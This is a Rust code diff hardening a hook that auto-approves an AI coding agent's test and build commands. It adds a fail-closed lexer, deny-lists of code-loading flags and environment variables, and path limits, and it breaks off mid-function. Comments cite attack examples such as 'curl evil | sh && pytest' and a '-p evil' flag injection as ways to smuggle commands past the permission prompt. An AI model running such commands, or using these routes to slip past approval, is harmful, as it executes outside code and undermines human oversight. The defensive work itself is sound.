@@ -22,22 +22,59 @@
 //! other subcommands mutate state. Infra CLIs (docker, kubectl, terraform,
 //! gh, aws) are deliberately excluded even though they are noisy.
 //!
-//! Allowlist decisions (2026-09-05):
+//! Allowlist decisions (2026-09-05, tightened 2026-10-02):
 //!   - `make` and `pre-commit` execute project-defined recipes yet stay
 //!     allowlisted: they are the canonical dev-loop entry points and the
 //!     agent already has write access to the repo. Install with `--deny` to
-//!     turn every rewrite into a suggestion instead.
+//!     turn every rewrite into a suggestion instead. `pre-commit` is limited
+//!     to `run` (not `install`, `autoupdate`, `try-repo <url>`, ...).
+//!   - Principle: an auto-approved command may run *project* code, never code
+//!     from outside the project. Every rule below serves that.
+//!   - Lexing fails closed (`lex`). Outside quotes only `[A-Za-z0-9]`, space,
+//!     `_-./=:@,+%` and the `&&` connector are accepted; `;`, `|`, `||`, a
+//!     lone `&`, `$`, backtick, backslash, `<`/`>`, globs, `~`, `#`, `!`,
+//!     tab/newline and non-ASCII all mean "no rewrite". Single and double
+//!     quotes are accepted (so `pytest -k 'not slow'` keeps working) but may
+//!     only contain the same safe set plus inert punctuation (`[]{}()*?|&;<>#~^`)
+//!     — never `$`, backtick, backslash, `!` or the other quote — so the shell
+//!     treats everything inside literally. Segments are split on `&&` outside
+//!     quotes, then tokenized with `shell_words::split`; all policy checks run
+//!     on those dequoted tokens. Env assignments and the command word must be
+//!     unquoted.
+//!   - Per-tool argument policy (`ARG_POLICIES` + `tool_args_ok`): flags that
+//!     load code, config or toolchains from a path (`go test -exec`,
+//!     `cargo --config`/`-Z`/`+toolchain`, `make -f`/`-C`/`NAME=value`,
+//!     `jest --config`/`--setupFiles`, `pytest -p`/`-c`/`-o`,
+//!     `gradle -I`/`-D`/`-P`, `mvn -s`/`-f`/`-D`, `dotnet -p:`/`@rsp`, ...)
+//!     end eligibility in every spelling (`--x=v`, `--x v`, `-xv`, bundled
+//!     `-qx v`, argparse/getopt abbreviations, camel/kebab case). Where a
+//!     full allowlist is practical it is one (`npm ci` flags, `uv` flags,
+//!     `pre-commit run`, `cargo nextest run|list`, mvn positional goals
+//!     without `:` so no ad-hoc plugin download); elsewhere (pytest has
+//!     hundreds of flags) it is a deny-list of the code-loading ones. A few
+//!     values are exempt because they are inert and common: `pytest -p no:X`,
+//!     JS built-in reporter/pool names, a short list of mvn `-D` properties
+//!     (`skipTests`, `test`, ...) and Xcode build settings
+//!     (`CODE_SIGNING_ALLOWED`, ...).
+//!   - Paths (`paths_ok`): any token with a `..` component, or holding an
+//!     absolute path outside the project root (the hook event's `cwd`), ends
+//!     eligibility — including the command word itself (`/tmp/x/pytest`). So
+//!     `cargo --manifest-path ../x/Cargo.toml`, `tsc -p /tmp/x` or
+//!     `pytest --junitxml=/tmp/r.xml` go through the normal prompt. A path
+//!     glued to a short flag (`-I/tmp`) is not seen as a path; every such
+//!     flag that loads code is in the deny-list instead.
 //!   - Tools with a mutating *mode* (`ruff format`, `--fix`, `swiftlint
-//!     autocorrect`) or that load code from an arbitrary path (`eslint -c`)
-//!     are gated per token in `MUTATING_TOKENS`; such a command is left
-//!     alone entirely (no rewrite, no deny).
+//!     autocorrect`) are gated per token in `MUTATING_TOKENS`; such a command
+//!     is left alone entirely (no rewrite, no deny).
 //!   - A leading `NAME=value` prefix rides along only for the benign names in
 //!     `SAFE_ENV_PREFIXES`; PATH, LD_PRELOAD, RUSTC_WRAPPER, NODE_OPTIONS,
-//!     DEVELOPER_DIR, ... change what executes, so they end eligibility.
+//!     PYTEST_ADDOPTS (injects arbitrary flags, e.g. `-p evil`), DEVELOPER_DIR,
+//!     ... change what executes, so they end eligibility.
 //!   - `npx`/`bunx`/`pnpx` launch only the JS tools in `RUNNER_TOOLS`.
 use anyhow::{bail, Result};
 use serde_json::{json, Value};
 use std::io::Read;
+use std::path::Path;
 
 mod install;
 
@@ -65,7 +102,7 @@ pub const SUBCOMMAND: &[(&str, &[&str])] = &[
         &["build", "test", "check", "clippy", "doc", "nextest"],
     ),
     ("go", &["test", "build", "vet"]),
-    ("npm", &["test", "ci"]),
+    ("npm", &["test", "t", "ci"]),
     ("pnpm", &["test"]),
     ("yarn", &["test"]),
     ("bun", &["test"]),
@@ -73,6 +110,7 @@ pub const SUBCOMMAND: &[(&str, &[&str])] = &[
     ("gradle", &["test", "build", "check"]),
     ("gradlew", &["test", "build", "check"]),
     ("mvn", &["test", "verify", "package"]),
+    ("mvnw", &["test", "verify", "package"]),
     ("swift", &["test", "build"]),
     ("ruff", &["check"]),
 ];
@@ -101,13 +139,12 @@ pub const SAFE_ENV_PREFIXES: &[&str] = &[
     "NODE_ENV",
     "PYTHONDONTWRITEBYTECODE",
     "PYTHONUNBUFFERED",
-    "PYTEST_ADDOPTS",
 ];
 
 /// Tokens (flags or subcommands) that turn an otherwise read-mostly tool
-/// into one that rewrites files or loads code from an arbitrary path. Any
-/// segment containing one is left alone entirely (`None`): no rewrite, no
-/// deny — the user's normal permission flow decides.
+/// into one that rewrites files. Any segment containing one is left alone
+/// entirely (`None`): no rewrite, no deny — the user's normal permission flow
+/// decides. Flags that load code from a path live in `ARG_POLICIES`.
 pub const MUTATING_TOKENS: &[(&str, &[&str])] = &[
     (
         "ruff",
@@ -119,19 +156,400 @@ pub const MUTATING_TOKENS: &[(&str, &[&str])] = &[
             "format",
         ],
     ),
-    (
-        "eslint",
-        &[
-            "--fix",
-            "--fix-dry-run",
-            "--fix-type",
-            "-c",
-            "--config",
-            "--rulesdir",
-            "--resolve-plugins-relative-to",
-        ],
-    ),
+    ("eslint", &["--fix", "--fix-dry-run", "--fix-type"]),
     ("swiftlint", &["--fix", "autocorrect"]),
+];
+
+/// How one tool spells the options that load code, config or a toolchain
+/// from a path (or set properties that can), so `tool_args_ok` catches every
+/// spelling. Any hit ends auto-wrap eligibility: no rewrite, normal prompt.
+struct ArgPolicy {
+    tools: &'static [&'static str],
+    /// Long option names, normalized by `norm` (lowercase, no `-`/`_`):
+    /// `--name`, `--name=v`, `--Name`, `--na-me`.
+    long: &'static [&'static str],
+    /// Like `long`, but denied when the normalized name merely *contains* the
+    /// word (JS runners expose dotted config keys: `--coverage.customProviderModule`).
+    long_contains: &'static [&'static str],
+    /// Long names may be abbreviated to any unique prefix (argparse,
+    /// getopt_long, Ruby OptionParser): `--confi` denies like `--config-file`.
+    abbrev: bool,
+    /// Single-dash options are long options too (Go's flag package,
+    /// xcodebuild): `-exec` == `--exec`.
+    single_dash_long: bool,
+    /// Short options, case-sensitive, matched as a prefix of a single-dash
+    /// token: `-c`, `-cfile`, `-c=file`, `-Dprop=v`, `-Xswiftc`, `-gs`.
+    short: &'static [&'static str],
+    /// Short flags bundle (`-qpfoo` = `-q -p foo`): a one-letter `short`
+    /// anywhere in a single-dash cluster is a hit. Fails closed on a value
+    /// glued to another flag (`-kcopy`), which is acceptable.
+    bundled: bool,
+    /// Exact tokens that are fine although a `short` prefix matches them.
+    allow: &'static [&'static str],
+    /// (hit, value check): a hit on this `long`/`long_contains`/`short`
+    /// entry is fine when its value (glued or the next token) passes.
+    exempt: &'static [(&'static str, ValueCheck)],
+}
+
+/// Whether an otherwise denied option's value is inert.
+type ValueCheck = fn(&str) -> bool;
+
+impl ArgPolicy {
+    const NONE: ArgPolicy = ArgPolicy {
+        tools: &[],
+        long: &[],
+        long_contains: &[],
+        abbrev: false,
+        single_dash_long: false,
+        short: &[],
+        bundled: false,
+        allow: &[],
+        exempt: &[],
+    };
+}
+
+/// The JS runners (and the package-manager `test` scripts that usually run
+/// them) share one policy: jest's yargs and vitest's cac both accept camel
+/// and kebab case, and most config keys are also CLI flags.
+const JS_LONG: &[&str] = &[
+    "env",
+    "envfile",
+    "api",
+    "ui",
+    "open",
+    "prefix",
+    "registry",
+    "call",
+    "scriptshell",
+    "nodeoptions",
+];
+const JS_LONG_CONTAINS: &[&str] = &[
+    "config",
+    "setup",
+    "teardown",
+    "runner",
+    "transform",
+    "resolver",
+    "environment",
+    "reporter",
+    "processor",
+    "plugin",
+    "sequencer",
+    "provider",
+    "preset",
+    "project",
+    "root",
+    "dir",
+    "workspace",
+    "module",
+    "loader",
+    "preload",
+    "require",
+    "import",
+    "define",
+    "tsconfig",
+    "cwd",
+    "inspect",
+    "browser",
+    "prettier",
+    "haste",
+    "pool",
+];
+
+fn js_builtin_reporter(v: &str) -> bool {
+    [
+        "default",
+        "verbose",
+        "dot",
+        "json",
+        "junit",
+        "tap",
+        "tap-flat",
+        "basic",
+        "summary",
+        "tree",
+        "github-actions",
+        "hanging-process",
+    ]
+    .contains(&v)
+}
+
+fn js_builtin_pool(v: &str) -> bool {
+    ["threads", "forks", "vmThreads", "vmForks"].contains(&v)
+}
+
+fn pytest_disable_plugin(v: &str) -> bool {
+    v.starts_with("no:")
+}
+
+/// mvn `-D` properties common in a test loop that select or skip work and
+/// can't point the build at outside code.
+fn mvn_safe_property(v: &str) -> bool {
+    let name = v.split('=').next().unwrap_or(v);
+    [
+        "skipTests",
+        "maven.test.skip",
+        "skipITs",
+        "test",
+        "it.test",
+        "failIfNoTests",
+        "surefire.failIfNoSpecifiedTests",
+        "checkstyle.skip",
+        "spotbugs.skip",
+        "pmd.skip",
+        "jacoco.skip",
+        "enforcer.skip",
+        "spotless.check.skip",
+        "maven.javadoc.skip",
+        "gpg.skip",
+        "style.color",
+    ]
+    .contains(&name)
+}
+
+const ARG_POLICIES: &[ArgPolicy] = &[
+    ArgPolicy {
+        tools: &["go"],
+        single_dash_long: true,
+        long: &[
+            "exec",
+            "toolexec",
+            "overlay",
+            "modfile",
+            "vettool",
+            "ldflags",
+            "gcflags",
+            "asmflags",
+            "gccgoflags",
+            "compiler",
+            "pkgdir",
+        ],
+        short: &["C"],
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["cargo"],
+        long: &["config", "configfile", "toolconfigfile"],
+        short: &["Z", "C"],
+        bundled: true,
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["make"],
+        long: &["file", "makefile", "directory", "includedir", "eval"],
+        abbrev: true,
+        short: &["f", "C", "I", "E"],
+        bundled: true,
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["jest", "vitest", "npm", "pnpm", "yarn", "bun"],
+        long: JS_LONG,
+        long_contains: JS_LONG_CONTAINS,
+        short: &["c", "r", "C"],
+        bundled: true,
+        exempt: &[("reporter", js_builtin_reporter), ("pool", js_builtin_pool)],
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["eslint"],
+        long: &[
+            "config",
+            "rulesdir",
+            "resolvepluginsrelativeto",
+            "plugin",
+            "parser",
+            "inspectconfig",
+            "mcp",
+        ],
+        short: &["c"],
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["mypy"],
+        long: &[
+            "configfile",
+            "pythonexecutable",
+            "installtypes",
+            "customtypesheddir",
+            "shadowfile",
+        ],
+        abbrev: true,
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        // pytest disables argparse abbreviations (`--confcut` is an error).
+        tools: &["pytest"],
+        long: &[
+            "confcutdir",
+            "rootdir",
+            "overrideini",
+            "configfile",
+            "inifile",
+            "basetemp",
+            "pdbcls",
+            "covconfig",
+            "tx",
+            "rsyncdir",
+        ],
+        short: &["p", "c", "o"],
+        bundled: true,
+        exempt: &[("p", pytest_disable_plugin)],
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["phpunit"],
+        long: &[
+            "bootstrap",
+            "configuration",
+            "includepath",
+            "extension",
+            "printer",
+            "loader",
+            "generateconfiguration",
+            "migrateconfiguration",
+        ],
+        abbrev: true,
+        short: &["c", "d"],
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["rspec"],
+        long: &["require", "options", "defaultpath"],
+        abbrev: true,
+        short: &["r", "I", "O"],
+        bundled: true,
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["gradle", "gradlew"],
+        long: &[
+            "initscript",
+            "settingsfile",
+            "buildfile",
+            "systemprop",
+            "projectprop",
+            "gradleuserhome",
+            "includebuild",
+            "scan",
+        ],
+        short: &["I", "c", "b", "D", "P", "g"],
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["mvn", "mvnw"],
+        long: &[
+            "settings",
+            "globalsettings",
+            "toolchains",
+            "globaltoolchains",
+            "file",
+            "define",
+        ],
+        short: &["s", "gs", "t", "gt", "f", "D"],
+        allow: &["-fae", "-ff", "-fn"],
+        exempt: &[("D", mvn_safe_property), ("define", mvn_safe_property)],
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["swift"],
+        long: &[
+            "toolchain",
+            "sdk",
+            "swiftsdk",
+            "swiftsdkspath",
+            "destination",
+            "disablesandbox",
+            "packagepath",
+            "scratchpath",
+            "buildpath",
+            "cachepath",
+            "configpath",
+            "securitypath",
+            "pkgconfigpath",
+            "netrcfile",
+        ],
+        short: &["X"],
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["xcodebuild"],
+        single_dash_long: true,
+        long: &[
+            "xcconfig",
+            "toolchain",
+            "xctestrun",
+            "skipmacrovalidation",
+            "skippackagepluginvalidation",
+        ],
+        ..ArgPolicy::NONE
+    },
+    ArgPolicy {
+        tools: &["pre-commit"],
+        long: &["config"],
+        abbrev: true,
+        short: &["c"],
+        bundled: true,
+        ..ArgPolicy::NONE
+    },
+];
+
+/// `npm ci` installs exactly the lockfile; these flags only quiet it down or
+/// narrow it. Anything else (`--registry`, `--prefix`, ...) is not wrapped.
+const NPM_CI_FLAGS: &[&str] = &[
+    "--ignore-scripts",
+    "--no-audit",
+    "--no-fund",
+    "--no-progress",
+    "--silent",
+    "--quiet",
+    "-q",
+    "--prefer-offline",
+    "--offline",
+    "--include=dev",
+    "--omit=dev",
+    "--omit=optional",
+    "--omit=peer",
+    "--loglevel=error",
+    "--loglevel=warn",
+    "--loglevel=silent",
+];
+
+/// dotnet/MSBuild switches (any of `-x`, `--x`, `/x`, value after `:` or
+/// `=`) that set properties, load loggers/adapters/settings, or change the
+/// package source or environment.
+const DOTNET_DENY: &[&str] = &[
+    "p",
+    "property",
+    "rp",
+    "restoreproperty",
+    "l",
+    "logger",
+    "dl",
+    "distributedlogger",
+    "s",
+    "settings",
+    "a",
+    "testadapterpath",
+    "e",
+    "environment",
+    "source",
+    "configfile",
+    "collect",
+];
+
+/// Xcode build settings safe to pass on the command line (`NAME=value`);
+/// any other upper-case setting (`CC=`, `SWIFT_EXEC=`, `OTHER_LDFLAGS=`)
+/// can swap the compiler or linker.
+const XCODE_SAFE_SETTINGS: &[&str] = &[
+    "CODE_SIGNING_ALLOWED",
+    "CODE_SIGNING_REQUIRED",
+    "CODE_SIGN_IDENTITY",
+    "ONLY_ACTIVE_ARCH",
+    "ENABLE_TESTABILITY",
+    "COMPILER_INDEX_STORE_ENABLE",
+    "SWIFT_TREAT_WARNINGS_AS_ERRORS",
+    "GCC_TREAT_WARNINGS_AS_ERRORS",
 ];
 
 /// Runner prefixes: wrap when the NEXT word is itself an ALWAYS tool.
@@ -216,10 +634,12 @@ fn rewrite_from_stdin(deny: bool) -> Result<i32> {
     }
     // Fail-open: an unreadable cwd just means no project-declared scripts
     // this call, not an error — the built-in allowlist still applies.
-    let wrap_scripts = std::env::current_dir()
-        .map(|cwd| crate::config::load_merged(&cwd).wrap_scripts)
+    let cwd = std::env::current_dir().ok();
+    let wrap_scripts = cwd
+        .as_deref()
+        .map(|cwd| crate::config::load_merged(cwd).wrap_scripts)
         .unwrap_or_default();
-    if let Some(out) = rewrite_decision_with_scripts(&input, deny, &wrap_scripts) {
+    if let Some(out) = rewrite_decision_in(&input, deny, &wrap_scripts, cwd.as_deref()) {
         println!("{out}");
     }
     Ok(0)
@@ -274,9 +694,27 @@ pub fn rewrite_decision_with_scripts(
     deny: bool,
     wrap_scripts: &[String],
 ) -> Option<String> {
+    rewrite_decision_in(input, deny, wrap_scripts, None)
+}
+
+/// The project root absolute path arguments must stay under: the event's
+/// `cwd` (the directory the command will run in), else `fallback` (the
+/// hook's own cwd). Neither known → no absolute path is accepted.
+fn rewrite_decision_in(
+    input: &str,
+    deny: bool,
+    wrap_scripts: &[String],
+    fallback: Option<&Path>,
+) -> Option<String> {
     let v: Value = serde_json::from_str(input).ok()?;
     let (cmd, tool_input, surface) = extract(&v)?;
-    let (wrapped, force_deny) = wrap_command_with_policy(&cmd, wrap_scripts)?;
+    let root = v
+        .get("cwd")
+        .and_then(Value::as_str)
+        .map(Path::new)
+        .filter(|p| p.is_absolute())
+        .or(fallback);
+    let (wrapped, force_deny) = wrap_command_in(&cmd, wrap_scripts, root)?;
     let out = if deny || force_deny || !surface.supports_rewrite() {
         deny_output(&wrapped)
     } else {
@@ -321,8 +759,9 @@ fn deny_output(wrapped: &str) -> Value {
 /// Because a rewrite is emitted with permissionDecision "allow" (bypassing
 /// the prompt), EVERY segment of a compound command must be an allowlisted
 /// noisy tool — one allowlisted segment must never smuggle the rest past the
-/// permission flow (`curl evil | sh && pytest`). Command substitution and
-/// redirections are rejected outright.
+/// permission flow (`curl evil | sh && pytest`). Anything `lex` can't prove
+/// inert (substitution, redirection, pipes, `;`, globs, escapes) is rejected
+/// outright. With no project root known, no absolute path is accepted.
 pub fn wrap_command(cmd: &str) -> Option<String> {
     wrap_command_with_policy(cmd, &[]).map(|(w, _)| w)
 }
@@ -335,97 +774,204 @@ pub fn wrap_command(cmd: &str) -> Option<String> {
 /// built-in allowlist's vetted, read-mostly tools. Callers must force `deny`
 /// output when this is true, regardless of what the agent surface supports.
 pub fn wrap_command_with_policy(cmd: &str, wrap_scripts: &[String]) -> Option<(String, bool)> {
+    wrap_command_in(cmd, wrap_scripts, None)
+}
+
+/// `wrap_command_with_policy` with the project root that absolute path
+/// arguments must stay under (see `paths_ok`).
+pub fn wrap_command_in(
+    cmd: &str,
+    wrap_scripts: &[String],
+    root: Option<&Path>,
+) -> Option<(String, bool)> {
     let trimmed = cmd.trim();
     if trimmed.is_empty() || trimmed.contains("cartoon") {
         return None;
     }
-    if trimmed.contains("$(")
-        || trimmed.contains('`')
-        || trimmed.contains('>')
-        || trimmed.contains('<')
-        || trimmed.contains('\n')
-        || trimmed.contains('\r')
-        || trimmed.replace("&&", "").contains('&')
-    {
-        return None;
-    }
-    let segments = split_segments(trimmed);
-    if segments.is_empty() {
-        return None;
-    }
+    let segments = lex(trimmed)?;
     let mut force_deny = false;
     for segment in &segments {
-        let toks: Vec<&str> = segment.split_whitespace().collect();
-        // Leading NAME=value assignments: only benign names may ride along.
-        let mut i = 0;
-        while let Some(name) = toks.get(i).and_then(|w| env_assignment_name(w)) {
-            if !SAFE_ENV_PREFIXES.contains(&name) {
-                return None;
-            }
-            i += 1;
+        match judge_segment(segment, wrap_scripts, root)? {
+            Match::Builtin => {}
+            Match::Script => force_deny = true,
         }
-        let first = *toks.get(i)?;
-        let rest = &toks[i + 1..];
-        // `xcrun <tool>` only locates the Xcode toolchain binary; judge the tool.
-        let (first, rest) = if basename(first) == "xcrun" {
-            match rest.split_first() {
-                Some((f, r)) => (*f, r),
-                None => return None,
+    }
+    let escaped = trimmed.replace('\'', r"'\''");
+    // `--merge-streams`: agent shells (Claude Code's Bash tool among them)
+    // capture stdout and stderr separately and show stdout first, so the
+    // model never sees where a warning landed among the output. Merged, the
+    // compressed result keeps arrival order on stdout.
+    Some((
+        format!("cartoon --merge-streams -c '{escaped}'"),
+        force_deny,
+    ))
+}
+
+/// How a segment qualified for wrapping.
+enum Match {
+    /// The built-in allowlist, with every argument passing its policy.
+    Builtin,
+    /// Only a project-declared `wrap_scripts` entry: deny-only.
+    Script,
+}
+
+/// One shell word: its dequoted text and whether it was (partly) quoted.
+struct Word {
+    text: String,
+    quoted: bool,
+}
+
+/// Characters accepted outside quotes.
+fn is_plain(c: char) -> bool {
+    c.is_ascii_alphanumeric() || " _-./=:@,+%".contains(c)
+}
+
+/// Characters accepted inside single or double quotes: the plain set plus
+/// punctuation the shell treats literally there. `$`, backtick, backslash
+/// and `!` (still special inside double quotes) never are, and neither is
+/// the other quote character, so quoting can't nest.
+fn is_quoted_ok(c: char) -> bool {
+    is_plain(c) || "[]{}()*?|&;<>#~^".contains(c)
+}
+
+/// Fail-closed lexer: split on `&&` outside quotes, then tokenize each
+/// segment with `shell_words::split`. None when any character is outside the
+/// conservative sets above, a quote is unbalanced, a lone `&` appears, or a
+/// segment is empty — the command then runs through the normal prompt.
+fn lex(cmd: &str) -> Option<Vec<Vec<Word>>> {
+    let mut segments = Vec::new();
+    let mut raw = String::new();
+    let mut quote: Option<char> = None;
+    let mut chars = cmd.chars();
+    while let Some(c) = chars.next() {
+        match quote {
+            Some(q) if c == q => quote = None,
+            Some(_) if !is_quoted_ok(c) => return None,
+            Some(_) => {}
+            None if c == '\'' || c == '"' => quote = Some(c),
+            None if c == '&' => {
+                if chars.next() != Some('&') {
+                    return None;
+                }
+                segments.push(words(&raw)?);
+                raw.clear();
+                continue;
             }
-        } else {
-            (first, rest)
-        };
-        let base = basename(first);
-        if STATE_BUILTINS.contains(&first) || STATE_BUILTINS.contains(&base) {
+            None if !is_plain(c) => return None,
+            None => {}
+        }
+        raw.push(c);
+    }
+    if quote.is_some() {
+        return None;
+    }
+    segments.push(words(&raw)?);
+    Some(segments)
+}
+
+/// Tokenize one `&&`-free segment. Pairs each `shell_words` token with
+/// whether its raw word contained a quote; the counts must agree.
+fn words(raw: &str) -> Option<Vec<Word>> {
+    let tokens = shell_words::split(raw).ok()?;
+    let mut quoted = Vec::new();
+    let (mut in_word, mut word_quoted, mut quote) = (false, false, None);
+    for c in raw.chars() {
+        match quote {
+            Some(q) if c == q => quote = None,
+            Some(_) => {}
+            None if c == ' ' => {
+                if in_word {
+                    quoted.push(word_quoted);
+                }
+                (in_word, word_quoted) = (false, false);
+            }
+            None => {
+                in_word = true;
+                if c == '\'' || c == '"' {
+                    quote = Some(c);
+                    word_quoted = true;
+                }
+            }
+        }
+    }
+    if in_word {
+        quoted.push(word_quoted);
+    }
+    if tokens.is_empty() || tokens.len() != quoted.len() {
+        return None;
+    }
+    Some(
+        tokens
+            .into_iter()
+            .zip(quoted)
+            .map(|(text, quoted)| Word { text, quoted })
+            .collect(),
+    )
+}
+
+/// Decide one segment: a built-in noisy tool whose arguments all pass
+/// policy, a declared project script, or None (poisons the whole command).
+fn judge_segment(seg: &[Word], wrap_scripts: &[String], root: Option<&Path>) -> Option<Match> {
+    let toks: Vec<&str> = seg.iter().map(|w| w.text.as_str()).collect();
+    // Leading NAME=value assignments: only benign names may ride along.
+    let mut i = 0;
+    while let Some(name) = toks.get(i).and_then(|w| env_assignment_name(w)) {
+        if seg[i].quoted || !SAFE_ENV_PREFIXES.contains(&name) {
             return None;
         }
+        i += 1;
+    }
+    // A quoted command word (`'CI=1' pytest`) parses differently from how it
+    // reads; refuse rather than reason about it.
+    if seg.get(i)?.quoted {
+        return None;
+    }
+    let first = toks[i];
+    let rest = &toks[i + 1..];
+    // `xcrun <tool>` only locates the Xcode toolchain binary; judge the tool.
+    let (first, rest) = if basename(first) == "xcrun" {
+        let (f, r) = rest.split_first()?;
+        (*f, r)
+    } else {
+        (first, rest)
+    };
+    let base = basename(first);
+    if STATE_BUILTINS.contains(&first) || STATE_BUILTINS.contains(&base) {
+        return None;
+    }
+    let builtin = if base == "xcodebuild" {
         // xcodebuild actions (test/build) float among flags, so the single
-        // next-word check can't gate them — reuse the adapter's full-argv scan.
-        // Only the summarizable read-mostly actions are eligible.
-        if base == "xcodebuild" {
-            let argv = full_argv(first, rest);
-            use crate::adapters::xcodebuild::Action;
-            if !matches!(
-                crate::adapters::xcodebuild::action(&argv),
-                Some(Action::Test) | Some(Action::Build)
-            ) {
-                return None;
-            }
-            continue;
-        }
-        // `uv run pytest`, `uvx ruff check`, `uv run -m pytest`, … need to look
-        // several words past the prefix, so the single next-word check can't
-        // gate them either.
-        if base == "uv" || base == "uvx" {
-            if !uv_wraps_noisy(&full_argv(first, rest)) {
-                return None;
-            }
-            continue;
-        }
+        // next-word check can't gate them — reuse the adapter's full-argv
+        // scan. Only the summarizable read-mostly actions are eligible.
+        use crate::adapters::xcodebuild::Action;
+        matches!(
+            crate::adapters::xcodebuild::action(&full_argv(first, rest)),
+            Some(Action::Test) | Some(Action::Build)
+        ) && tool_args_ok("xcodebuild", rest)
+    } else if base == "uv" || base == "uvx" {
+        // `uv run pytest`, `uvx ruff check`, `uv run -m pytest`, … need to
+        // look several words past the prefix, so the single next-word check
+        // can't gate them either.
+        uv_wraps_noisy(&full_argv(first, rest))
+    } else {
         // Resolve the tool a runner prefix launches so the mutating-token
         // scan sees the real tool (`npx eslint --fix`).
         let (tool, tool_rest) = if RUNNERS.contains(&base) {
-            match rest.split_first() {
-                Some((t, r)) => (basename(t), r),
-                None => return None,
-            }
+            let (t, r) = rest.split_first()?;
+            (basename(t), r)
         } else {
             (base, rest)
         };
         if has_mutating_token(tool, tool_rest) {
             return None;
         }
-        if is_noisy(base, rest.first().copied()) {
-            continue;
+        if !is_noisy(base, rest) {
+            return matches_wrap_script(first, rest.first().copied(), wrap_scripts)
+                .then_some(Match::Script);
         }
-        if matches_wrap_script(first, rest.first().copied(), wrap_scripts) {
-            force_deny = true;
-            continue;
-        }
-        return None;
-    }
-    let escaped = trimmed.replace('\'', r"'\''");
-    Some((format!("cartoon -c '{escaped}'"), force_deny))
+        args_ok(base, rest)
+    };
+    (builtin && paths_ok(&toks, root)).then_some(Match::Builtin)
 }
 
 fn basename(word: &str) -> &str {
@@ -448,9 +994,8 @@ fn env_assignment_name(word: &str) -> Option<&str> {
     valid.then_some(name)
 }
 
-/// True when `rest` carries a token that makes `tool` mutate files or load
-/// code from an arbitrary path (see `MUTATING_TOKENS`). `--flag=value` forms
-/// match on the flag name.
+/// True when `rest` carries a token that makes `tool` mutate files (see
+/// `MUTATING_TOKENS`). `--flag=value` forms match on the flag name.
 fn has_mutating_token<S: AsRef<str>>(tool: &str, rest: &[S]) -> bool {
     let Some((_, toks)) = MUTATING_TOKENS.iter().find(|(t, _)| *t == tool) else {
         return false;
@@ -459,6 +1004,198 @@ fn has_mutating_token<S: AsRef<str>>(tool: &str, rest: &[S]) -> bool {
         let w = w.as_ref();
         toks.iter()
             .any(|t| w == *t || w.strip_prefix(t).is_some_and(|r| r.starts_with('=')))
+    })
+}
+
+/// Resolve the tool a noisy command actually runs (`npx jest` → jest,
+/// `python -m pytest` → pytest, uv's `-m pytest` → pytest) and check its
+/// arguments against `tool_args_ok`.
+fn args_ok(base: &str, rest: &[&str]) -> bool {
+    if RUNNERS.contains(&base) {
+        return rest
+            .split_first()
+            .is_some_and(|(t, r)| tool_args_ok(basename(t), r));
+    }
+    let module = if base.starts_with("python") {
+        rest.get(1..) // past `-m`
+    } else if base == "-m" || base == "--module" {
+        Some(rest)
+    } else {
+        return tool_args_ok(base, rest);
+    };
+    module
+        .and_then(|m| m.split_first())
+        .is_some_and(|(m, r)| tool_args_ok(m, r))
+}
+
+/// Per-tool argument policy: the `ARG_POLICIES` deny-lists plus the
+/// allowlists that need more than a flag name.
+fn tool_args_ok(tool: &str, args: &[&str]) -> bool {
+    let first_positional = || args.iter().copied().find(|a| !a.starts_with('-'));
+    let special = match tool {
+        // Only a toolchain chosen by the project, and only nextest's
+        // read-mostly sub-subcommands (`cargo nextest self update` replaces
+        // the binary).
+        "cargo" => {
+            !args.iter().any(|a| a.starts_with('+'))
+                && (args.first() != Some(&"nextest")
+                    || matches!(args.get(1), Some(&"run" | &"r" | &"list")))
+        }
+        // `make CC=/tmp/x` / `SHELL=` / `MAKE=` override the Makefile.
+        "make" => !args.iter().any(|a| env_assignment_name(a).is_some()),
+        // `install`, `autoupdate`, `try-repo <url>`, `gc`, ... are not a
+        // dev-loop run (try-repo runs hooks from an arbitrary repo).
+        "pre-commit" => first_positional().is_none_or(|p| p == "run"),
+        "npm" if args.first() == Some(&"ci") => args[1..].iter().all(|a| NPM_CI_FLAGS.contains(a)),
+        // A goal with `:` (`org.x:plugin:1.0:goal`) downloads and runs an
+        // arbitrary plugin; lifecycle phases have none.
+        "mvn" | "mvnw" => args.iter().all(|a| a.starts_with('-') || !a.contains(':')),
+        "dotnet" => dotnet_args_ok(args),
+        "xcodebuild" => args.iter().all(|a| xcode_setting_ok(a)),
+        _ => true,
+    };
+    special
+        && ARG_POLICIES
+            .iter()
+            .filter(|p| p.tools.contains(&tool))
+            .all(|p| p.allows(args))
+}
+
+impl ArgPolicy {
+    /// True when no argument hits this policy (or every hit is exempt).
+    fn allows(&self, args: &[&str]) -> bool {
+        let mut i = 0;
+        while i < args.len() {
+            let a = args[i];
+            i += 1;
+            if self.allow.contains(&a) {
+                continue;
+            }
+            let Some((hit, glued)) = self.hit(a) else {
+                continue;
+            };
+            let Some((_, value_ok)) = self.exempt.iter().find(|(e, _)| *e == hit) else {
+                return false;
+            };
+            let value = match glued {
+                Some(v) => Some(v),
+                None => {
+                    i += 1;
+                    args.get(i - 1).copied()
+                }
+            };
+            if !value.is_some_and(value_ok) {
+                return false;
+            }
+        }
+        true
+    }
+
+    /// The denied option `a` spells, with its glued value if any.
+    fn hit<'a>(&self, a: &'a str) -> Option<(&'static str, Option<&'a str>)> {
+        if let Some(body) = a.strip_prefix("--") {
+            return self.long_hit(body);
+        }
+        let body = a.strip_prefix('-').filter(|b| !b.is_empty())?;
+        if self.single_dash_long {
+            if let Some(h) = self.long_hit(body) {
+                return Some(h);
+            }
+        }
+        let glued = |r: &'a str| Some(r.strip_prefix('=').unwrap_or(r)).filter(|v| !v.is_empty());
